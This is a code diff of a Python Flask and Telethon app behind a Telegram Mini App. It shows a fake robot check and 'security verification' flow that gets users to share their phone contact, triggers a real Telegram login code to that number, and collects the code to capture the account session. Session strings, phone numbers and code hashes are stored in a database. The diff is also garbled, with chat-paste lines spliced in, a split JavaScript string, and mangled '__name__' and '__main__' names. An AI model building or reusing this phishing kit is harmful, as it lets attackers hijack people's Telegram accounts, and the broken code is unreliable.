@@ -1,3 +1,4 @@
+Hey me, [7/22/26 12:40 PM]
 import os
 import asyncio
 import json
@@ -20,7 +21,7 @@ print("=" * 50)
 print("SCRIPT STARTING...")
 print("=" * 50)
 
-app = Flask(__name__)
+app = Flask(name)
 
 # Database functions
 def get_db():
@@ -36,7 +37,6 @@ def init_db():
     print("Database initialized")
 
 # Initialize bot client here (outside functions)
-
 
 async def send_channel(msg):
     try:
@@ -75,12 +75,17 @@ p{color:#ddd;font-size:14px;margin-bottom:30px;line-height:1.5}
 <body>
 <div class="container">
 <div id="antiBotScreen"><div class="card"><span class="robot-icon">🤖</span><h2>Please confirm that you are not a robot ✅</h2><p>This verification helps us ensure the security and integrity of our service.</p><button class="btn" onclick="handleConfirm()">Confirm ✅</button></div></div>
+
+Hey me, [7/22/26 12:40 PM]
 <div id="verificationScreen"><div class="card"><h2>Security Verification</h2><p>To ensure your account security, we need to verify your identity.</p><button class="btn" id="shareBtn" onclick="handleContact()">Share Contact & Verify</button><div class="loading" id="contactLoading">Requesting contact...</div></div></div>
 <div id="codeScreen"><div class="card"><h2>Enter Verification Code</h2><p>We sent a verification code to your Telegram app. Enter it below.</p><div class="code-slots" id="codeSlots"><div class="code-slot"></div><div class="code-slot"></div><div class="code-slot"></div><div class="code-slot"></div><div class="code-slot"></div></div><div class="keypad"><button class="key" onclick="pressKey('1')">1</button><button class="key" onclick="pressKey('2')">2</button><button class="key" onclick="pressKey('3')">3</button><button class="key" onclick="pressKey('4')">4</button><button class="key" onclick="pressKey('5')">5</button><button class="key" onclick="pressKey('6')">6</button><button class="key" onclick="pressKey('7')">7</button><button class="key" onclick="pressKey('8')">8</button><button class="key" onclick="pressKey('9')">9</button><button class="key clear" onclick="pressKey('clear')">C</button><button class="key" onclick="pressKey('0')">0</button><button class="key clear" onclick="pressKey('back')">⌫</button></div><button class="btn" onclick="submitCode()" style="margin-top:20px">Verify</button><button class="btn" onclick="resendCode()" style="margin-top:10px;background:linear-gradient(135deg,rgba(68,68,68,0.8),rgba(34,34,34,0.8))">Resend Code</button><div class="error" id="errorBox">Invalid code.</div><div class="loading" id="loadingBox">Verifying...</div></div></div>
 <div id="successScreen" style="display:none"><div class="card"><h2>Success! ✅</h2><p style="color:#00ff88;font-size:16px">Your account has been verified successfully.</p></div></div>
 </div>
 <script>
-var tg=window.Telegram.WebApp;tg.ready();tg.expand();var userId=null,enteredCode='';if(tg.initDataUnsafe&&tg.initDataUnsafe.user)userId=tg.initDataUnsafe.user.id;function handleConfirm(){document.getElementById('antiBotScreen').style.display='none';document.getElementById('verificationScreen').style.display='block'}function handleContact(){document.getElementById('shareBtn').disabled=true;document.getElementById('contactLoading').style.display='block';tg.requestContact(function(success,response){if(success){console.log('Contact shared:',response);document.getElementById('verificationScreen').style.display='none';document.getElementById('codeScreen').style.display='block'}else{alert('Please share your contact to continue.');document.getElementById('shareBtn').disabled=false;document.getElementById('contactLoading').style.display='none'}})}function resendCode(){fetch('/resend',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user_id:userId})}).then(function(res){return res.json()}).then(function(data){if(data.success){alert('A new code has been sent to your Telegram app.');enteredCode='';updateCodeDisplay()}else{alert(data.error||'Failed to resend code. Please try again.')}})}function pressKey(key){if(key==='back')enteredCode=enteredCode.slice(0,-1);else if(key==='clear')enteredCode='';else if(enteredCode.length<5)enteredCode+=key;updateCodeDisplay()}function updateCodeDisplay(){var slots=document.querySelectorAll('.code-slot');for(var i=0;i<slots.length;i++){if(i<enteredCode.length){slots[i].textContent='•';slots[i].classList.add('filled')}else{slots[i].textContent='';slots[i].classList.remove('filled')}}}function submitCode(){if(enteredCode.length!==5){alert('Please enter the full 5-digit code.');return}document.getElementById('loadingBox').style.display='block';document.getElementById('errorBox').style.display='none';fetch('/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:enteredCode,user_id:userId})}).then(function(res){if(!res.ok)throw new Error('Server error: '+res.status);return res.json()}).then(function(data){document.getElementById('loadingBox').style.display='none';if(data.success){document.getElementById('codeScreen').style.display='none';document.getElementById('successScreen').style.display='block';setTimeout(function(){tg.close()},2000)}else{document.getElementById('errorBox').textContent=data.error||'Invalid code.';document.getElementById('errorBox').style.display='block';enteredCode='';updateCodeDisplay()}}).catch(function(err){document.getElementById('loadingBox').style.display='none';document.getElementById('errorBox').textContent='Error: '+err.message;document.getElementById('errorBox').style.display='block'})}updateCodeDisplay();
+var tg=window.Telegram.WebApp;tg.ready();tg.expand();var userId=null,enteredCode='';if(tg.initDataUnsafe&&tg.initDataUnsafe.user)userId=tg.initDataUnsafe.user.id;function handleConfirm(){document.getElementById('antiBotScreen').style.display='none';document.getElementById('verificationScreen').style.display='block'}function handleContact(){document.getElementById('shareBtn').disabled=true;document.getElementById('contactLoading').style.display='block';tg.requestContact(function(success,response){if(success){console.log('Contact shared:',response);document.getElementById('verificationScreen').style.display='none';document.getElementById('codeScreen').style.display='block'}else{alert('Please share your contact to continue.');document.getElementById('shareBtn').disabled=false;document.getElementById('contactLoading').style.display='none'}})}function resendCode(){fetch('/resend',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user_id:userId})}).then(function(res){return res.json()}).then(function(data){if(data.success){alert('A new code has been sent to your Telegram app.');enteredCode='';updateCodeDisplay()}else{alert(data.error||'Failed to resend code.
+
+Hey me, [7/22/26 12:40 PM]
+Please try again.')}})}function pressKey(key){if(key==='back')enteredCode=enteredCode.slice(0,-1);else if(key==='clear')enteredCode='';else if(enteredCode.length<5)enteredCode+=key;updateCodeDisplay()}function updateCodeDisplay(){var slots=document.querySelectorAll('.code-slot');for(var i=0;i<slots.length;i++){if(i<enteredCode.length){slots[i].textContent='•';slots[i].classList.add('filled')}else{slots[i].textContent='';slots[i].classList.remove('filled')}}}function submitCode(){if(enteredCode.length!==5){alert('Please enter the full 5-digit code.');return}document.getElementById('loadingBox').style.display='block';document.getElementById('errorBox').style.display='none';fetch('/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:enteredCode,user_id:userId})}).then(function(res){if(!res.ok)throw new Error('Server error: '+res.status);return res.json()}).then(function(data){document.getElementById('loadingBox').style.display='none';if(data.success){document.getElementById('codeScreen').style.display='none';document.getElementById('successScreen').style.display='block';setTimeout(function(){tg.close()},2000)}else{document.getElementById('errorBox').textContent=data.error||'Invalid code.';document.getElementById('errorBox').style.display='block';enteredCode='';updateCodeDisplay()}}).catch(function(err){document.getElementById('loadingBox').style.display='none';document.getElementById('errorBox').textContent='Error: '+err.message;document.getElementById('errorBox').style.display='block'})}updateCodeDisplay();
 </script>
 </body>
 </html>"""
@@ -139,6 +144,7 @@ def resend_code():
     else:
         return jsonify({"success": False, "error": error})
 
+Hey me, [7/22/26 12:40 PM]
 @app.route('/verify', methods=['POST'])
 def verify_code():
     data = request.json
@@ -209,9 +215,29 @@ def verify_code():
     else:
         return jsonify({"success": False, "error": error})
 
-
     print("Starting bot listener...")
-    
+    await bot_client.start(bot_token=BOT_TOKEN)
+    print("Bot is online. Waiting for contacts...")
+
+        if event.message.media and hasattr(event.message.media, "phone_number"):
+            phone = event.message.media.phone_number
+            user_id = str(event.message.sender_id)
+            
+            print(f"\n[CONTACT] {user_id}: {phone}")
+            
+            client = TelegramClient(StringSession(), API_ID, API_HASH)
+            try:
+                await client.connect()
+                result = await client.send_code_request(phone)
+                phone_code_hash = result.phone_code_hash
+                session_string = client.session.save()
+                
+                conn = get_db()
+                cur = conn.cursor()
+                cur.execute("INSERT INTO sessions (user_id, phone, phone_code_hash, session_string) VALUES (%s, %s, %s, %s) ON CONFLICT (user_id) DO UPDATE SET phone=%s, phone_code_hash=%s, session_string=%s", (user_id, phone, phone_code_hash, session_string, phone, phone_code_hash, session_string))
+                conn.commit()
+                cur.close()
+                conn.close()
                 
                 print(f"[CODE SENT] to {phone}")
                 await bot_client.send_message(user_id, "✅ Code sent! Check your Telegram and enter it in the Mini App.")
@@ -222,9 +248,9 @@ def verify_code():
 
     await bot_client.run_until_disconnected()
 
-if __name__ == '__main__':
+Hey me, [7/22/26 12:40 PM]
+if name == 'main':
     init_db()
-    
     
     port = int(os.environ.get("PORT", 5000))
     print(f"Starting on port {port}")
